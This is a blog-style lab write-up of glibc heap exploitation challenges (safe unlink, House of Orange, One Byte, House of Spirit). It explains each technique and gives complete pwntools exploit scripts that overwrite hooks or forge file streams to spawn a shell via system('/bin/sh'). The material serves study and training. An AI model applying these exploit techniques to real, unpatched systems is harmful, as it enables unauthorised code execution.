shell.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 #!/usr/bin/env python3 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./safe_unlink\u0026#39;, checksec=False) libc = ELF(\u0026#39;../.glibc/glibc_2.30_no-tcache/libc.so.6\u0026#39;, checksec=False) #libc = elf.libc gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+218 b *main+326 b *main+606 b *main+735 \u0026#34;\u0026#34;\u0026#34; index = 0 def info(mes): return log.info(mes) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) else: return process(elf.path) def malloc(size): global index io.send(b\u0026#39;1\u0026#39;) io.sendafter(b\u0026#39;size: \u0026#39;, str(size).encode()) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) index += 1 return index - 1 def edit(index, data): io.send(b\u0026#39;2\u0026#39;) io.sendafter(b\u0026#39;index: \u0026#39;, str(index).encode()) io.sendafter(b\u0026#39;data: \u0026#39;, data) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def free(index): io.send(b\u0026#39;3\u0026#39;) io.sendafter(b\u0026#39;index: \u0026#39;, str(index).encode()) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def target(): io.send(b\u0026#39;4\u0026#39;) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def quit(): io.send(b\u0026#39;5\u0026#39;) io = start() io.recvuntil(b\u0026#39;puts() @ \u0026#39;) puts = int(io.recvline(), 16) libc.address = puts - libc.sym[\u0026#39;puts\u0026#39;] info(\u0026#34;libc base: \u0026#34; + hex(libc.address)) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) chunk_a = malloc(0x88) chunk_b = malloc(0x88) chunk_prev = p64(0) chunk_size = p64(0x80) fd = p64(elf.sym[\u0026#39;m_array\u0026#39;] - 0x18) bk = p64(elf.sym[\u0026#39;m_array\u0026#39;] - 0x10) nop = p8(0)*(0x88 - 8*5) fake_prev_size = p64(0x80) fake_size = p64(0x90) payload = chunk_prev + chunk_size + fd + bk + nop + fake_prev_size + fake_size edit(0, payload) free(chunk_b) overlapped_mparray = p64(0)*3 + p64(libc.sym[\u0026#39;__free_hook\u0026#39;] - 8) edit(0, overlapped_mparray) edit(0, b\u0026#39;/bin/sh\\x00\u0026#39; + p64(libc.sym[\u0026#39;system\u0026#39;])) target() io.interactive() House of Orange This challenge is in the Linux Heap Exploitation - Part 1, and it is worth to write something about it.\nOverall Challenge gives me 4 options as the image above.\nIf i only request malloc(small) and edit with data: aaaaa malloc(small): call malloc() with the size 0x20 malloc(large): call malloc() with the size 0xfd0 edit: write data to the start of small chunk quit: simply exit the program. However the challenge doesn\u0026rsquo;t give me free()\u0026hellip;\nBug As you see, I can overwrite the heap.\nApproach Create free chunk The challenge doesn\u0026rsquo;t give me free option(), but it allows me to overwrite the heap(chunk size, prev_size,\u0026hellip;.. include of top chunk size).\nDocument for top chunk in HeapLab - GLIBC Heap Exploitation.pdf I can create an unsorted bin by overwriting the size field of the top chunk -\u0026gt; request a larger size than this size.\nMain Arena will use brk syscall to request the new memory from kernel. Because the new memory doesn\u0026rsquo;t border the end of the heap. Thus, malloc assume that the kernel was unable to map contiguous memory from the heap. Since the new memory is larger, malloc starts a new heap from it(set top chunk pointer to the new memory) and so as not to waste space, it frees the old top chunk.\nNotice Malloc keeps track of the remaining memory in a top chunk using its size field, the prev_inuse bit of which is always set. A top chunk always contains enough memory to allocate a minimum-sized chunk and always ends on a page boundary.\nOverwiting top chunk size with: 0x1000 - 0x20 + 1, then request the large size The result Find the target Unsortedbin attack I can write the address of unsortedbin to somewhere(fd + 0x10) by following bk pointer to overwrite this address to fd poiner.\nTarget file stream If the program uses fopen or something else, the file steam will be used. Or if not, there will also be one because the program always contains stdin(0), stdout(1), and stderr(2).\nHowever, what if I target one of the standard I/O vtable pointer.\nOur unsortedbin attack would replace that vtable pointer with the address of the main arena\u0026rsquo;s unsortedbin. Then the next time a standard I/O member function was called, the main arena would be treated as a vtable. The main arena consists primarily of empty linked lists at this point, and attempting to execute those addresses would just lead to a general protection fault as we tried to execute memory marked as non-executable. Even if I were to populate some of those bins with pointers to heap memory by sorting chunks into them, heaps are no more executable than arenas. Fortunately, I have _IO_list_all pointer(the head of a list of every file stream).\nThis process has open and it\u0026rsquo;s used when GLIBC needs to perform an operation on all open file streams, typically cleanup procedures. One of those cleanup procedures is performed when a program exits, either via the GLIBC exit() function or by returning from its main() function. Conclusion\nI will target the _IO_list_all pointer with our unsortedbin attack, replacing it with a pointer into the main arena, then we exit the program. As the program exits and GLIBC cleans up, it will attempt to flush the buffers of any open file streams. It does this by iterating over every file stream in the _IO_list_all list, determining whether its buffers require flushing, and if so, calling a specific member function named \u0026lsquo;overflow\u0026rsquo; on that file stream, nothing to do with this sort of overflows. Script 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 #!/usr/bin/env python3 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./house_of_orange\u0026#39;, checksec=False) libc = ELF(\u0026#39;../.glibc/glibc_2.23/libc.so.6\u0026#39;, checksec=False) gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+287 b *main+353 b *main+412 b *main+478 b *_IO_flush_all_lockp \u0026#34;\u0026#34;\u0026#34; def info(mes): return log.info(mes) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) else: return process(elf.path) def malloc_small(): io.sendline(b\u0026#39;1\u0026#39;) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def malloc_large(): #io.sendline(b\u0026#39;2\u0026#39;) #io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.sendthen(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;2\u0026#34;) def edit(data): io.sendline(b\u0026#39;3\u0026#39;) io.sendlineafter(b\u0026#39;data: \u0026#39;, data) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def quit(): io.send(b\u0026#39;4\u0026#39;) io = start() io.recvuntil(b\u0026#39;puts() @ \u0026#39;) puts = int(io.recvline(), 16) io.recvuntil(b\u0026#39;heap @ \u0026#39;) heap = int(io.recvline(), 16) libc.address = puts - libc.sym[\u0026#39;puts\u0026#39;] info(\u0026#34;libc base: \u0026#34; + hex(libc.address)) #=============================================================================================== # Create unsortedbin list io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) malloc_small() #overwrite top chunk size field to initial new heap from kernel edit(b\u0026#39;Y\u0026#39;*0x18 + p64(0x1000 - 0x20 + 1)) malloc_large() #=============================================================================================== #unsortedbin attack size = 0x21 fd = 0x0 bk = libc.sym[\u0026#39;_IO_list_all\u0026#39;] - 0x10 unsortedbin_attack = b\u0026#39;Y\u0026#39;*16 +\\ p64(0) + p64(size) +\\ p64(fd) + p64(bk) edit(unsortedbin_attack) malloc_small() quit() io.interactive() Set up Now, I have what I want.\nHowever, the program get segmentation fault.\nAnd _IO_flush_all_lockp() uses to determine whether a file stream requires flushing.\nThe reason for that is this file stream doesn\u0026rsquo;t pass the check.\nAfter all this function is trying to treat the main arena like a file stream. The line containing _IO_OVERFLOW in all caps is the one calling the \u0026lsquo;overflow\u0026rsquo; member function. The first argument, \u0026lsquo;fp\u0026rsquo;, represents the file stream overflow() is being called from. There are two checks prior to this line, each one of which must pass in order for overflow() to be called. The first check passes if the \u0026lsquo;_mode\u0026rsquo; field of the file stream is less than or equal to zero and its _IO_write_ptr field is larger than its _IO_write_base field. The second check _mode larger than zero. It will fail the first check due to the latter and the second check due to the former. In this case _IO_flush_all_lockp() won\u0026rsquo;t call this file stream\u0026rsquo;s overflow() function and will instead move on to the next stream the current stream\u0026rsquo;s _chain pointer(_chain points back into the main arena).\nThe bk of the 0x60 smallbin is what\u0026rsquo;s being treated as this rogue file stream\u0026rsquo;s _chain pointer. So if we change the size field of the old top chunk from 0x21 to 0x61 before our unsortedbin attack, the old top chunk will be sorted into the 0x60 smallbin rather than being allocated, and end up as the _chain pointer of the rogue file stream overlapping the main arena. This allows me to forge our own fake file stream on the heap, providing our own vtable pointer and vtable entries\nLet\u0026rsquo;s build the fake file stream.\nChange my script little\n1 2 3 4 5 6 7 8 9 10 11 size = 0x61 fd = 0x0 bk = libc.sym[\u0026#39;_IO_list_all\u0026#39;] - 0x10 unsortedbin_attack = b\u0026#39;Y\u0026#39;*16 +\\ flag + p64(size) +\\ p64(fd) + p64(bk) +\\ b\u0026#39;a\u0026#39;*8 + b\u0026#39;b\u0026#39;*8 edit(unsortedbin_attack) malloc_small() quit() Now, we need to pass the check\nfp \u0026gt; write_ptr \u0026gt; write_base fp -\u0026gt; mode \u0026lt;= 0 Afterwards, I need to set up to call system(\u0026quot;/bin/sh\u0026quot;).\nI provide a vtable pointer to a vtable in which the overflow() entry is populated by the function. When the overflow() function is called, its first argument is the address of the file stream it\u0026rsquo;s called from. That means if I write the string \u0026ldquo;/bin/sh\u0026rdquo; into the first quadword of our file stream, which is where the \u0026lsquo;_flags\u0026rsquo; field resides, then point the overflow() vtable entry at the GLIBC system() function, the call becomes system(\u0026quot;/bin/sh\u0026quot;) and I get a shell without the need for a one-gadget. Complete script 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 #!/usr/bin/env python3 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./house_of_orange\u0026#39;, checksec=False) libc = ELF(\u0026#39;../.glibc/glibc_2.23/libc.so.6\u0026#39;, checksec=False) #libc = elf.libc gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+287 b *main+353 b *main+412 b *main+478 b *_IO_flush_all_lockp \u0026#34;\u0026#34;\u0026#34; def info(mes): return log.info(mes) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) else: return process(elf.path) def malloc_small(): io.sendline(b\u0026#39;1\u0026#39;) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def malloc_large(): #io.sendline(b\u0026#39;2\u0026#39;) #io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.sendthen(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;2\u0026#34;) def edit(data): io.sendline(b\u0026#39;3\u0026#39;) io.sendlineafter(b\u0026#39;data: \u0026#39;, data) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def quit(): io.send(b\u0026#39;4\u0026#39;) io = start() io.timeout = 0.1 io.recvuntil(b\u0026#39;puts() @ \u0026#39;) puts = int(io.recvline(), 16) io.recvuntil(b\u0026#39;heap @ \u0026#39;) heap = int(io.recvline(), 16) libc.address = puts - libc.sym[\u0026#39;puts\u0026#39;] info(\u0026#34;libc base: \u0026#34; + hex(libc.address)) #=============================================================================================== # Create unsortedbin list io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) malloc_small() #overwrite top chunk size field to initial new heap from kernel edit(b\u0026#39;Y\u0026#39;*0x18 + p64(0x1000 - 0x20 + 1)) malloc_large() #=============================================================================================== #unsortedbin attack # =-=-=- PREPARE A FAKE _IO_FILE STRUCT -=-=-= # Set up a fake _IO_FILE struct alongside an unsortedbin attack. # This chunk is sorted into the 0x60 smallbin later, meaning a pointer to it will form # the _chain member of the _IO_FILE struct overlapping the main arena. #fp flag = b\u0026#39;/bin/sh\\x00\u0026#39; size = 0x61 # A chunk\u0026#39;s fd is ignored during a partial unlink. fd = 0x0 # Set up the bk pointer of this free chunk to point near _IO_list_all. # This way _IO_list_all is overwritten by a pointer to the unsortedbin during the unsortedbin attack. bk = libc.sym[\u0026#39;_IO_list_all\u0026#39;] - 0x10 # Ensure fp-\u0026gt;_IO_write_ptr \u0026gt; fp-\u0026gt;_IO_write_base. write_base = 0x01 write_ptr = 0x02 # Ensure fp-\u0026gt;_mode \u0026lt;= 0. mode = 0x0 # For convenience place the pointer to system() in the last qword of the _IO_FILE struct, # which is part of the _unused2 area. # Set up the vtable pointer so that the __overflow entry overlaps this pointer. vtable_ptr = heap + 0xd8 unsortedbin_attack = b\u0026#39;Y\u0026#39;*16 +\\ flag + p64(size) +\\ p64(fd) + p64(bk) +\\ p64(write_base) + p64(write_ptr) + p64(0)*18 +\\ p32(mode) + p8(0)*12 +\\ p64(libc.sym[\u0026#39;system\u0026#39;]) + p64(vtable_ptr) edit(unsortedbin_attack) # =-=-=- TRIGGER UNSORTEDBIN ATTACK -=-=-= # Request the second small chunk, this sorts the old top chunk into the 0x60 smallbin and in doing so triggers # the unsortedbin attack against _IO_list_all. # The \u0026#34;chunk\u0026#34; at _IO_list_all will fail a size sanity check, causing malloc to call abort(). This in turn will # call _IO_flush_all_lockp(). # The main arena (sometimes) fails the _IO_OVERFLOW checks and fp-\u0026gt;_chain is followed which points to the old # top chunk. Now the fake _IO_FILE struct is processed and the _IO_OVERFLOW checks will pass, the fake # vtable pointer is followed and the fake __overflow entry is called. malloc_small() io.interactive() One byte Overall Full armour No leak libc, heap. No double free. No UAF. malloc As you see, it calls calloc instead of malloc with a size of 0x58 (0x60 for chunk). Memory blocks allocated by the calloc function are always initialized to zero. free It is simple that the program call free to free the chunk at index from user input. edit It takes input from user(index) to write data to this index chunk. Input with a size of 0x59. read It is simple that the program call write data from the chunk at index to stdout. quit Leave the program. Bug Call alloc to allocate 0x58 size; however, it take input from the user with 0x59 size. This mean that I can overwrite one byte. Template 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 #!/usr/bin/env python3 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./one_byte\u0026#39;, checksec=False) libc = ELF(\u0026#39;../.glibc/glibc_2.23/libc.so.6x\u0026#39;, checksec=False) index = 0 gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+244 b *main+311 b *main+415 b *main+480 b *main+560 b *main+652 b *main+713 b *main+788 \u0026#34;\u0026#34;\u0026#34; def info(mes): return log.info(mes) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) elif args.remote: return remote(\u0026#39;\u0026#39;, ) else: return process(elf.path) def malloc(): global index io.sendline(b\u0026#39;1\u0026#39;) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) index += 1 return index - 1 def free(index): io.sendline(b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;index: \u0026#39;, str(index).encode()) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def edit(index, data): io.sendline(b\u0026#39;3\u0026#39;) io.sendlineafter(b\u0026#39;index: \u0026#39;, str(index).encode()) io.sendlineafter(b\u0026#39;data: \u0026#39;, data) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def read(index): io.sendline(b\u0026#39;4\u0026#39;) io.sendlineafter(b\u0026#39;index: \u0026#39;, str(index).encode()) output = io.recv(0x58) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) return output def quit(): io.sendline(b\u0026#39;5\u0026#39;) io = start() io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.interactive() Approach Everything will be better if I have the address of libc and heap Leak libc target: unsortedbin + remainder.\nI can overwrite one byte, so I can control the size of the succeeding chunk. Thus, if I overwrite the size of the chunk with the larger size, then free it, this free chunk will overlap other chunk that doesn\u0026rsquo;t free. 1 2 3 4 5 6 7 chunk_A = malloc() chunk_B = malloc() chunk_C = malloc() chunk_D = malloc() edit(chunk_A, p8(0)*0x58 + p8(0xc1)) free(chunk_B) After overwrite After free Now, I can write and read data in chunk_C, which is overlaped by free chunk, so I can leak data from this free chunk.\nAdd some lines of code and see the result\n1 2 3 4 5 chunk_B2 = malloc() unsortedbin_data = read(chunk_C) unsortedbin = u64(unsortedbin_data[0:8]) info(\u0026#34;unsortedbin: \u0026#34; + hex(unsortedbin)) Leak heap target: fastbin dup\nAdd some lines of code\n1 2 3 4 5 6 7 chunk_C2 = malloc() free(chunk_A) free(chunk_C2) fastbin_data = read(chunk_C) heap = u64(fastbin_data[0:8]) info(\u0026#34;heap: \u0026#34; + hex(heap)) The house of orange target: overwrite vtable of _IO_list_all to trigger overflow function in vtable for pop shell. Because I can overwrite one byte(size of chunk), I can control heap to create fake file stream.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # house of oragne chunk_C3 = malloc() chunk_A2 = malloc() edit(chunk_A2, p8(0)*0x58 + p8(0xc1)) free(chunk_B2) chunk_B3 = malloc() # string \u0026#34;/bin/sh\u0026#34; to _flag size field edit(chunk_B3, p64(0)*10 + b\u0026#39;/bin/sh\\x00\u0026#39;) payload = \\ p64(0) + p64(libc.sym[\u0026#39;_IO_list_all\u0026#39;] - 0x10) +\\ p64(1) + p64(2) edit(chunk_C3, payload) edit(chunk_E, p64(libc.sym[\u0026#39;system\u0026#39;]) + p64(heap + 0x178)) malloc() My configure struct\nHowever, there will be a mistake when I do it. Notice that triggers can happen when sorting this fake chunk, not allocating it (the program will not abort and the location of this will not reside in 0x60 bk small bin)\nIO_list_all IO_list_all.file._chain I set up fake file stream successfully; however, I need to trigger to move it into _IO_list_all\nTrigger size Method 1 _IO_list_all -\u0026gt; _chain: 0x60 bk small bin -\u0026gt; _chain: 0xb0 small bin\nSet size chunk C to 0xb1\nMethod 2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 /* Take now instead of binning if exact fit */ if (size == nb) { set_inuse_bit_at_offset (victim, size); if (av != \u0026amp;main_arena) victim-\u0026gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } /* place chunk in bin */ The exact fitting chunks are allocated from the unsortedbin, otherwise they\u0026rsquo;re sorted into the appropriate small or large bin. The \u0026rsquo;nb\u0026rsquo; variable represents the normalized request size, it\u0026rsquo;s the result of malloc rounding up your request to the nearest actual chunk size. For example, if I request 3 bytes, \u0026rsquo;nb\u0026rsquo; would hold the value 0x20. In the case of our challenge binary \u0026rsquo;nb\u0026rsquo; is always 0x60. The \u0026lsquo;size\u0026rsquo; variable represents the size of the unsorted chunk currently under inspection. malloc masks off the chunk\u0026rsquo;s flags prior to this comparison to stop them from interfering. But chunk size fields only hold three flags, the fourth least-significant bit is neither a flag nor does it contribute to a chunk\u0026rsquo;s size. During unsorted bin searches it is not masked off prior to this comparison because there\u0026rsquo;s no good reason for it to ever be set in the first place. So if we set the fourth least-significant bit of our 0x60 chunk, giving it a size field of 0x68, or 0x69 if you want to keep the prev_inuse flag, it won\u0026rsquo;t be considered an exact fit during requests for 0x60-sized chunks. However, it will sort this chunk to 0x60 small bin. Furthermore, the code responsible for sorting chunks into their respective bins does mask off, specifically it rotates away, the entire low order nybble of their size field, meaning that our chunk with the 0x68 size field will still be correctly sorted into the 0x60 smallbin. Set size chunk C to 0x68\nComplete script 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 #!/usr/bin/env python3 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./one_byte\u0026#39;, checksec=False) libc = ELF(\u0026#39;../.glibc/glibc_2.23/libc.so.6\u0026#39;, checksec=False) index = 0 gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+244 b *main+311 b *main+415 b *main+480 b *main+560 b *main+652 b *main+713 b *main+788 \u0026#34;\u0026#34;\u0026#34; def info(mes): return log.info(mes) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) elif args.remote: return remote(\u0026#39;\u0026#39;, ) else: return process(elf.path) def malloc(): global index io.sendline(b\u0026#39;1\u0026#39;) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) index += 1 return index - 1 def free(index): io.sendline(b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;index: \u0026#39;, str(index).encode()) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def edit(index, data): io.sendline(b\u0026#39;3\u0026#39;) io.sendlineafter(b\u0026#39;index: \u0026#39;, str(index).encode()) io.sendafter(b\u0026#39;data: \u0026#39;, data) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def read(index): io.sendline(b\u0026#39;4\u0026#39;) io.sendlineafter(b\u0026#39;index: \u0026#39;, str(index).encode()) output = io.recv(0x58) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) return output def quit(): io.sendline(b\u0026#39;5\u0026#39;) io = start() io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) chunk_A = malloc() chunk_B = malloc() chunk_C = malloc() chunk_D = malloc() chunk_E = malloc() # =================================================================================================== # Leak libc edit(chunk_A, p8(0)*0x58 + p8(0xc1)) free(chunk_B) chunk_B2 = malloc() unsortedbin_data = read(chunk_C) unsortedbin = u64(unsortedbin_data[0:8]) libc.address = unsortedbin - 0x399b78 info(\u0026#34;unsortedbin: \u0026#34; + hex(unsortedbin)) info(\u0026#34;libc base: \u0026#34; + hex(libc.address)) # =================================================================================================== # Leak heap chunk_C2 = malloc() free(chunk_A) free(chunk_C2) fastbin_data = read(chunk_C) heap = u64(fastbin_data[0:8]) info(\u0026#34;heap: \u0026#34; + hex(heap)) # =================================================================================================== # house of oragne chunk_C3 = malloc() chunk_A2 = malloc() edit(chunk_A2, p8(0)*0x58 + p8(0xc1)) free(chunk_B2) chunk_B3 = malloc() # string \u0026#34;/bin/sh\u0026#34; to _flag size field edit(chunk_B3, p64(0)*10 + b\u0026#39;/bin/sh\\x00\u0026#39; + p8(0x68)) #edit(chunk_B3, p64(0)*10 + b\u0026#39;/bin/sh\\x00\u0026#39; + p8(0xb1)) payload = \\ p64(0) + p64(libc.sym[\u0026#39;_IO_list_all\u0026#39;] - 0x10) +\\ p64(1) + p64(2) edit(chunk_C3, payload) edit(chunk_E, p64(libc.sym[\u0026#39;system\u0026#39;]) + p64(heap + 0x178)) io.sendline(b\u0026#39;1\u0026#39;) io.interactive() ","date":"2024-06-15T00:00:00Z","image":"https://demo.stack.jimmycai.com/p/welcome-to-linux-heap-exploitation-~-part-1/cover_hu1baf41c855c051bc94a2dd717dae5de0_73444_120x120_fill_q75_box_smart1.jpg","permalink":"https://demo.stack.jimmycai.com/p/welcome-to-linux-heap-exploitation-~-part-1/","title":"Linux Heap Exploitation - Part 1"},{"content":"Overall The House of Spirit is the only technique that does not rely on one of the conventional heap-related bugs, instead it takes advantage of a scenario that allows a designer to corrupt a pointer that is subsequently passed to free().\nBy passing a pointer to a fake chunk to free(), the fake chunk can be allocated and used to overwrite sensitive data.\nThe fake chunk must have an appropriate size field and in the case of a FAST CHUNK, must have a succeeding size field that satisfies size sanity checks, meaning that a designer must control at least 2 quadwords that straddle the target data. In the case of a small chunk, there must be 2 trailing size fields to ensure forward consolidation is not attempted, fencepost chunks will work. Because of this a designer must control at least 3 quadwords that straddle the target data.\nApproach Pass an arbitrary pointer to the free() function, linking a fake chunk into a bin which can be allocated later. Further use When combined with a heap leak, the House of Spirit can be used to coerce a double-free which can provide a more powerful primitive.\nLimitations If an arena’s contiguity flag is set, fake small chunks must reside at a lower address than their thread’s heap, this does not apply to fake fast chunks. Fake chunks must pass an alignment check, which not only ensures that they are 16-byte aligned but mitigates the presence of a set 4th-leastsignificant bit in the size field. Fake chunks must avoid having set NON_MAIN_ARENA and IS_MMAPED bits, in the former case the free() function will search for a non-existent arena and will most likely segfault whilst doing so, and in the latter case the fake chunk is unmapped rather than freed. Sanity checks Size field: IS_MMMAPED, NON_MAIN_ARENA and fourth-least significant bit must be clear.\nIS_MMAPED\nWhen malloc receives a request larger than a variable named \u0026ldquo;mmap_threshold\u0026rdquo;, the request will be serviced via the GLIBC mmap() function rather than from an arena. More deatail about mmap can be search from its manpage and you can find the \u0026ldquo;mmap_threshold\u0026rdquo; variable amongst the malloc parameters, which can be dumped with pwndbg mp command When a chunk is allocated via mmap, its IS_MMAPPED flag is set. When the free() function operates on a chunk with a set IS_MMAPPED flag,instead of linking it back into an arena, it will unmap the chunk with GLIBC\u0026rsquo;s munmap() function. NON_MAIN_ARENA\nThere are two types of arenas, the main arena, which resides in GLIBC\u0026rsquo;s data section and non-main arenas, which can be created by malloc in multithreaded applications. Because non-main arenas are created dynamically at runtime, malloc can\u0026rsquo;t resolve them using symbols. Instead, it gives new arenas and their corresponding heaps something called a \u0026ldquo;heap_info\u0026rdquo; struct and ensures they\u0026rsquo;re mapped at a specific alignment. Malloc can then locate non-main arenas by applying an and-mask to a chunk\u0026rsquo;s address to find its corresponding heap_info struct. To determine which arena a chunk should be linked into, the free() function checks its NON_MAIN_ARENA flag. When free() comes across a set NON_MAIN_ARENA flag, rather than linking the chunk into the main arena, it will instead apply that and-mask to the chunk\u0026rsquo;s address, in effect rounding it down to a much lower value in an attempt to locate that chunk\u0026rsquo;s arena. Of course, our fake chunk doesn\u0026rsquo;t belong to an arena, and therefore, when we try to free it, malloc rounds its address down to an unmapped address and subsequently segfaults. Under some circumstances, you could use the NON_MAIN_ARENA flag to orchestrate mayhem by providing a fake arena. malloc\u0026rsquo;s size sanity checks: instead of operating on the chunk being freed, it\u0026rsquo;s testing the succeeding chunk.\nIf that chunk is smaller than a fencepost chunk or larger than av-\u0026gt;system_mem, the mitigation is triggered. Constraints for chunk with size larger than fastbin size: \u0026ldquo;normal\u0026rdquo; chunk size range, making it eligible for unsortedbin insertion on free.\nprev_inuse bit must to be set: clear prev_inuse flag on a non-fast chunk will cause malloc to consolidate it with the previous chunk. prev_inuse bit of size field of the succeeding chunk must be set. If that flag is clear, that chunk we\u0026rsquo;re trying to free must already be free. The Unsafe Unlink technique taught us that malloc will also check the prev_inuse flag of the chunk after the succeeding chunk. If that\u0026rsquo;s clear, then it will attempt forward consolidation. The easiest way to avoid this is to provide a third fake size field using fencepost chunks(0x11). The version of GLIBC this binary is linked against, 2.30, also performs the same next size sanity check during unsortedbin scanning. Note These course binaries keep track of their allocated chunks using an array named \u0026ldquo;m_array\u0026rdquo; and the house_of_spirit program keeps its m_array on the stack.\nThis binary has an overflow bug which allowed us to overwrite a pointer that was subsequently passed to the free() function. The overflow bug manifests on the stack, but it could have occurred anywhere. We used this bug to replace a pointer with the address of a fake chunk we\u0026rsquo;d prepared overlapping ourtarget data.\nUsing a fake normal chunk in the House of Spirit has the same constraints as using a fast chunk, plus we need to control or find a third quadword with a set least-significant bit.\nThe advantages of using a normal chunk are that it can take on a wider range of sizes and we can remainder it, meaning that we don\u0026rsquo;t have to request the exact size of our fake chunk to allocate from it.\nThere is one disadvantage to using normal chunks in the House of Spirit\nChecking whether the next chunk is beyond the boundaries of the arena, this check is only applied to normal chunks during the free process, fast chunks are exempt. Our fake normal chunk, along with its succeeding chunk, are nowhere near the boundaries of the heap, but it\u0026rsquo;s only checking whether the next chunk is at an address larger than or equal to that of the end of the top chunk. This means that any address below that is fair game, including the writable segment of the program. So if you\u0026rsquo;re using fake fast chunks in the House of Spirit, they can be located anywhere you like, but when using fake normal chunks you\u0026rsquo;re limited to addresses below the end of the main arena\u0026rsquo;s heap. The exception to this rule is if the main arena has become non-contiguous under memory pressure.\nDrop a shell It requires more contrains\nThe first approach that comes to mind is why not just free that 0x7f chunk that we used for our fastbin dup the one that sits just before the malloc hook and is consistently formed by one of the standard IO vtable pointers and following padding quadword. That won\u0026rsquo;t work because a 0x7f size field has three set bits that will cause our House of Spirit primitive to fail, namely the IS_MMAPPED bit, the NON_MAIN_ARENA bit and the fourth-least significant bit. However, it triggered a mitigation before the one that checks the freed chunk\u0026rsquo;s size field. This mitigation is checking two things; The first is whether the freed chunk wraps around the VA space House of Force style. The second is whether the chunk is 16 byte aligned, due to the nature of how heaps are mapped and the fact that chunk sizes are always multiples of 16 bytes on this architecture, legitimate chunks should never be misaligned. Constraints\nI target to one of malloc\u0026rsquo;s hooks, our fake junk must be in the fastbin range because normal chunks can\u0026rsquo;t be freed at addresses above the default heap. The second, third and fourth least significant bits of our fake chunks size field must be clear. Our fake chunk must be 16 byte aligned. I need to provide a succeeding size field of appropriate value at the right location. Script overwrite.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 